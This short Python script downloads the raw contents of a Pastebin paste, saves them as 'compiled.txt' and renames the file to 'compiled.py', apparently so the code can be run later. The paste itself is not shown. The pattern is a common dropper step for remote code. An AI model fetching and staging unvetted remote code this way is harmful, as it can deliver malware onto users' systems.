from requests import get
import os

# Create a .txt file and open it
my_file = open("compiled.txt", "w")
# Writing text to .txt file with pastebin
my_file.write(get("https://pastebin.com/raw/6SMGNUNu").text)
my_file.close()
# Change the file extension from .txt to .py
os.rename("compiled.txt", "compiled.py")